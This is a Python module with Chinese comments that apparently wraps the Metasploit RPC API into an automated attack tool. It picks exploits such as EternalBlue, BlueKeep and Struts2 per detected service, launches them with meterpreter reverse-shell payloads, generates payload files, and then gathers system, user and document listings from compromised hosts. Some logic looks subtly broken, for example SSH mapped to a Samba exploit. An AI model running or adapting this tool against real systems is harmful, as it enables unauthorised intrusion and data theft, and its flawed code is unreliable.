#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Metasploit Integration Module - Dragon-V 系统
Metasploit 兼容接口模块

功能:
- Metasploit RPC API 连接
- 模块执行管理
- 载荷生成与部署
- 会话管理
- 漏洞利用自动化
"""

import socket
import subprocess
import json
import time
import threading
from typing import Dict, List, Optional, Any
import xmlrpc.client
import requests
import base64
import os

class MetasploitIntegration:
    """Metasploit 集成模块"""
    
    def __init__(self, host='127.0.0.1', port=55553, username='msf', password='msf'):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.client = None
        self.token = None
        self.sessions = {}
        self.is_connected = False
        
        # Metasploit 配置
        self.config = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'timeout': 30,
            'retry_attempts': 3
        }
        
        # 常用漏洞利用模块
        self.common_exploits = {
            'windows': {
                'eternalblue': 'exploit/windows/smb/ms17_010_eternalblue',
                'bluekeep': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
                'smbghost': 'exploit/windows/smb/cve_2020_0796_smbghost',
            },
            'linux': {
                'dirtycow': 'exploit/linux/local/cve_2016_5195_dirtycow',
                'samba': 'exploit/linux/samba/is_known_pipename',
                'shellshock': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            },
            'web': {
                'struts2': 'exploit/multi/http/struts2_code_exec',
                'joomla': 'exploit/multi/http/joomla_http_header_rce',
                'wordpress': 'exploit/multi/http/wp_admin_shell_upload',
            }
        }
        
        # 常用载荷
        self.common_payloads = {
            'windows': {
                'meterpreter_reverse_tcp': 'windows/meterpreter/reverse_tcp',
                'meterpreter_bind_tcp': 'windows/meterpreter/bind_tcp',
                'shell_reverse_tcp': 'windows/shell_reverse_tcp',
            },
            'linux': {
                'meterpreter_reverse_tcp': 'linux/x86/meterpreter/reverse_tcp',
                'meterpreter_bind_tcp': 'linux/x86/meterpreter/bind_tcp',
                'shell_reverse_tcp': 'linux/x86/shell_reverse_tcp',
            }
        }
    
    def initialize(self) -> bool:
        """初始化 Metasploit 集成"""
        try:
            # 检查并启动服务
            if not self.check_metasploit_service():
                print("[*] 尝试启动 Metasploit RPC 服务...")
                if not self.start_metasploit_service():
                    print("[-] 无法启动 Metasploit 服务")
                    return False
            
            # 连接服务
            return self.connect()
        except Exception as e:
            print(f"[-] Metasploit 初始化失败: {e}")
            return False
    
    def connect(self) -> bool:
        """连接到 Metasploit RPC 服务"""
        try:
            print(f"[+] 连接到 Metasploit RPC: {self.host}:{self.port}")
            
            # 创建 XML-RPC 客户端
            self.client = xmlrpc.client.ServerProxy(
                f'http://{self.host}:{self.port}/api/1.0',
                allow_none=True
            )
            
            # 认证
            auth_result = self.client.auth.login(self.username, self.password)
            
            if auth_result.get('result') == 'success':
                self.token = auth_result.get('token')
                self.is_connected = True
                print(f"[+] Metasploit 连接成功，Token: {self.token}")
                return True
            else:
                print(f"[-] Metasploit 认证失败: {auth_result}")
                return False
                
        except Exception as e:
            print(f"[-] Metasploit 连接失败: {e}")
            return False
    
    def check_metasploit_service(self) -> bool:
        """检查 Metasploit 服务状态"""
        try:
            # 检查端口是否开放
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result == 0:
                print(f"[+] Metasploit RPC 服务运行在 {self.host}:{self.port}")
                return True
            else:
                print(f"[-] Metasploit RPC 服务未运行在 {self.host}:{self.port}")
                return False
                
        except Exception as e:
            print(f"[-] 检查 Metasploit 服务失败: {e}")
            return False
    
    def start_metasploit_service(self) -> bool:
        """启动 Metasploit RPC 服务"""
        try:
            print("[*] 启动 Metasploit RPC 服务...")
            
            # Windows 启动命令
            if os.name == 'nt':
                cmd = [
                    'msfrpcd',
                    '-P', self.password,
                    '-U', self.username,
                    '-p', str(self.port),
                    '-S'
                ]
            else:
                cmd = [
                    'msfrpcd',
                    '-P', self.password,
                    '-U', self.username,
                    '-p', str(self.port),
                    '-f'
                ]
            
            # 后台启动
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True
            )
            
            # 等待服务启动
            time.sleep(5)
            
            # 检查服务状态
            if self.check_metasploit_service():
                print("[+] Metasploit RPC 服务启动成功")
                return True
            else:
                print("[-] Metasploit RPC 服务启动失败")
                return False
                
        except Exception as e:
            print(f"[-] 启动 Metasploit 服务失败: {e}")
            return False
    
    def get_modules(self, module_type: str = 'exploit') -> List[Dict]:
        """获取 Metasploit 模块列表"""
        if not self.is_connected:
            print("[-] 未连接到 Metasploit")
            return []
        
        try:
            modules = self.client.module.exploits(self.token) if module_type == 'exploit' else \
                     self.client.module.payloads(self.token) if module_type == 'payload' else \
                     self.client.module.auxiliary(self.token)
            
            print(f"[+] 获取到 {len(modules)} 个 {module_type} 模块")
            return modules
            
        except Exception as e:
            print(f"[-] 获取模块列表失败: {e}")
            return []
    
    def search_modules(self, keyword: str) -> List[Dict]:
        """搜索 Metasploit 模块"""
        if not self.is_connected:
            print("[-] 未连接到 Metasploit")
            return []
        
        try:
            # 搜索漏洞利用模块
            exploits = self.client.module.search(self.token, keyword)
            
            results = []
            for exploit in exploits:
                results.append({
                    'type': 'exploit',
                    'name': exploit.get('name', ''),
                    'description': exploit.get('description', ''),
                    'rank': exploit.get('rank', ''),
                    'disclosure_date': exploit.get('disclosure_date', '')
                })
            
            print(f"[+] 搜索 '{keyword}' 找到 {len(results)} 个模块")
            return results
            
        except Exception as e:
            print(f"[-] 搜索模块失败: {e}")
            return []
    
    def execute_exploit(self, target: str, exploit_module: str, payload: str, 
                       options: Dict = None) -> Dict:
        """执行漏洞利用"""
        if not self.is_connected:
            return {'success': False, 'error': '未连接到 Metasploit'}
        
        try:
            print(f"[*] 执行漏洞利用: {exploit_module}")
            print(f"[*] 目标: {target}")
            print(f"[*] 载荷: {payload}")
            
            # 设置模块选项
            exploit_options = {
                'RHOSTS': target,
                'PAYLOAD': payload,
                'LHOST': '127.0.0.1',  # 监听主机
                'LPORT': 4444,         # 监听端口
            }
            
            # 合并自定义选项
            if options:
                exploit_options.update(options)
            
            # 执行漏洞利用
            job_id = self.client.module.execute(
                self.token, 
                'exploit', 
                exploit_module, 
                exploit_options
            )
            
            if job_id and job_id.get('job_id'):
                result = {
                    'success': True,
                    'job_id': job_id.get('job_id'),
                    'module': exploit_module,
                    'target': target,
                    'payload': payload
                }
                
                print(f"[+] 漏洞利用任务已启动，Job ID: {job_id.get('job_id')}")
                
                # 等待并检查结果
                session_created = self._wait_for_session(timeout=60)
                if session_created:
                    result['session_created'] = True
                    result['session_id'] = list(self.sessions.keys())[-1]
                    print(f"[+] 会话建立成功，Session ID: {result['session_id']}")
                else:
                    result['session_created'] = False
                    print("[-] 会话建立失败")
                
                return result
            else:
                return {'success': False, 'error': '漏洞利用执行失败'}
                
        except Exception as e:
            print(f"[-] 执行漏洞利用失败: {e}")
            return {'success': False, 'error': str(e)}
    
    def _wait_for_session(self, timeout: int = 60) -> bool:
        """等待会话建立"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                sessions = self.client.session.list(self.token)
                
                if sessions:
                    self.sessions.update(sessions)
                    return True
                
                time.sleep(2)
                
            except Exception as e:
                print(f"[-] 检查会话状态失败: {e}")
                time.sleep(2)
        
        return False
    
    def get_sessions(self) -> Dict:
        """获取当前会话"""
        if not self.is_connected:
            return {}
        
        try:
            sessions = self.client.session.list(self.token)
            self.sessions.update(sessions)
            return sessions
            
        except Exception as e:
            print(f"[-] 获取会话列表失败: {e}")
            return {}
    
    def execute_in_session(self, session_id: str, command: str) -> Dict:
        """在会话中执行命令"""
        if not self.is_connected:
            return {'success': False, 'error': '未连接到 Metasploit'}
        
        try:
            print(f"[*] 在会话 {session_id} 中执行命令: {command}")
            
            # 执行命令
            result = self.client.session.meterpreter_write(
                self.token, 
                session_id, 
                command
            )
            
            # 读取输出
            time.sleep(2)  # 等待命令执行
            output = self.client.session.meterpreter_read(self.token, session_id)
            
            return {
                'success': True,
                'session_id': session_id,
                'command': command,
                'output': output.get('data', '')
            }
            
        except Exception as e:
            print(f"[-] 在会话中执行命令失败: {e}")
            return {'success': False, 'error': str(e)}
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, 
                        format: str = 'exe') -> Dict:
        """生成载荷"""
        if not self.is_connected:
            return {'success': False, 'error': '未连接到 Metasploit'}
        
        try:
            print(f"[*] 生成载荷: {payload_type}")
            
            # 设置选项
            options = {
                'LHOST': lhost,
                'LPORT': lport,
                'Format': format
            }
            
            # 生成载荷
            result = self.client.module.execute(
                self.token,
                'payload',
                payload_type,
                options
            )
            
            if result and result.get('payload'):
                payload_data = result.get('payload')
                
                return {
                    'success': True,
                    'payload_type': payload_type,
                    'format': format,
                    'data': payload_data,
                    'size': len(payload_data)
                }
            else:
                return {'success': False, 'error': '载荷生成失败'}
                
        except Exception as e:
            print(f"[-] 生成载荷失败: {e}")
            return {'success': False, 'error': str(e)}
    
    def save_payload_to_file(self, payload_data: str, filename: str) -> bool:
        """保存载荷到文件"""
        try:
            # 解码 base64 数据
            if payload_data.startswith('base64:'):
                payload_data = payload_data[7:]  # 移除 'base64:' 前缀
                decoded_data = base64.b64decode(payload_data)
            else:
                decoded_data = payload_data.encode() if isinstance(payload_data, str) else payload_data
            
            # 写入文件
            with open(filename, 'wb') as f:
                f.write(decoded_data)
            
            print(f"[+] 载荷已保存到: {filename}")
            return True
            
        except Exception as e:
            print(f"[-] 保存载荷失败: {e}")
            return False
    
    def automated_exploitation(self, target_info: Dict) -> Dict:
        """自动化漏洞利用"""
        print(f"[*] 启动自动化漏洞利用: {target_info.get('target', 'Unknown')}")
        
        results = {
            'target': target_info.get('target'),
            'services': target_info.get('services', []),
            'vulnerabilities': target_info.get('vulnerabilities', []),
            'exploits_attempted': [],
            'exploits_successful': [],
            'sessions_created': [],
            'data_collected': []
        }
        
        # 根据服务选择漏洞利用模块
        for service in target_info.get('services', []):
            exploit_module = self._select_exploit_for_service(service)
            if exploit_module:
                print(f"[*] 为服务 {service} 选择模块: {exploit_module}")
                
                # 执行漏洞利用
                exploit_result = self.execute_exploit(
                    target=target_info.get('target'),
                    exploit_module=exploit_module,
                    payload=self._select_payload_for_service(service)
                )
                
                results['exploits_attempted'].append({
                    'service': service,
                    'module': exploit_module,
                    'result': exploit_result
                })
                
                if exploit_result.get('success') and exploit_result.get('session_created'):
                    results['exploits_successful'].append(exploit_module)
                    results['sessions_created'].append(exploit_result.get('session_id'))
                    
                    # 收集数据
                    session_data = self._collect_session_data(exploit_result.get('session_id'))
                    if session_data:
                        results['data_collected'].append(session_data)
        
        return results
    
    def _select_exploit_for_service(self, service: str) -> Optional[str]:
        """根据服务选择漏洞利用模块"""
        service_lower = service.lower()
        
        if 'http' in service_lower or 'https' in service_lower:
            return self.common_exploits['web'].get('struts2')
        elif 'smb' in service_lower or '445' in service_lower:
            return self.common_exploits['windows'].get('eternalblue')
        elif 'rdp' in service_lower or '3389' in service_lower:
            return self.common_exploits['windows'].get('bluekeep')
        elif 'ssh' in service_lower or '22' in service_lower:
            return self.common_exploits['linux'].get('samba')
        
        return None
    
    def _select_payload_for_service(self, service: str) -> str:
        """根据服务选择载荷"""
        service_lower = service.lower()
        
        if 'windows' in service_lower:
            return self.common_payloads['windows']['meterpreter_reverse_tcp']
        elif 'linux' in service_lower:
            return self.common_payloads['linux']['meterpreter_reverse_tcp']
        else:
            return self.common_payloads['windows']['meterpreter_reverse_tcp']
    
    def _collect_session_data(self, session_id: str) -> Dict:
        """从会话中收集数据"""
        data = {
            'session_id': session_id,
            'system_info': '',
            'network_info': '',
            'user_info': '',
            'files_found': []
        }
        
        try:
            # 获取系统信息
            sysinfo_result = self.execute_in_session(session_id, 'sysinfo')
            if sysinfo_result.get('success'):
                data['system_info'] = sysinfo_result.get('output', '')
            
            # 获取网络信息
            ipconfig_result = self.execute_in_session(session_id, 'ipconfig')
            if ipconfig_result.get('success'):
                data['network_info'] = ipconfig_result.get('output', '')
            
            # 获取用户信息
            whoami_result = self.execute_in_session(session_id, 'getuid')
            if whoami_result.get('success'):
                data['user_info'] = whoami_result.get('output', '')
            
            # 查找敏感文件
            search_files_result = self.execute_in_session(session_id, 'search -f *.txt *.doc *.pdf *.xls')
            if search_files_result.get('success'):
                data['files_found'] = search_files_result.get('output', '').split('\n')
            
        except Exception as e:
            print(f"[-] 收集会话数据失败: {e}")
        
        return data
    
    def cleanup(self):
        """清理资源"""
        try:
            if self.client and self.token:
                # 关闭所有会话
                sessions = self.get_sessions()
                for session_id in sessions:
                    try:
                        self.client.session.stop(self.token, session_id)
                        print(f"[+] 关闭会话: {session_id}")
                    except:
                        pass
                
                # 注销
                self.client.auth.logout(self.token)
                print("[+] 已从 Metasploit 注销")
            
        except Exception as e:
            print(f"[-] 清理资源失败: {e}")
        
        self.is_connected = False
        self.token = None
        self.client = None
        self.sessions = {}

# 使用示例
def main():
    """Metasploit 集成模块使用示例"""
    
    # 创建 Metasploit 集成实例
    msf = MetasploitIntegration()
    
    # 检查并启动服务
    if not msf.check_metasploit_service():
        print("[*] 启动 Metasploit RPC 服务...")
        if not msf.start_metasploit_service():
            print("[-] 无法启动 Metasploit 服务")
            return
    
    # 连接 Metasploit
    if msf.connect():
        print("[+] Metasploit 集成模块初始化成功")
        
        # 获取模块列表
        exploits = msf.get_modules('exploit')
        print(f"可用漏洞利用模块: {len(exploits)}")
        
        # 搜索特定模块
        search_results = msf.search_modules('eternalblue')
        for result in search_results[:3]:
            print(f"模块: {result['name']}")
        
        # 示例目标信息
        target_info = {
            'target': '192.168.1.100',
            'services': ['smb', 'http'],
            'vulnerabilities': ['MS17-010', 'CVE-2019-0708']
        }
        
        # 自动化漏洞利用
        exploitation_result = msf.automated_exploitation(target_info)
        print(f"自动化利用结果: {exploitation_result}")
        
        # 清理
        msf.cleanup()
        
    else:
        print("[-] Metasploit 连接失败")

# 全局实例
msf_integration = MetasploitIntegration()

# 异步初始化函数
async def initialize():
    """异步初始化Metasploit集成"""
    try:
        msf_integration.connect()
        return True
    except Exception as e:
        print(f"[!] Metasploit初始化失败: {e}")
        return False

if __name__ == "__main__":
    main()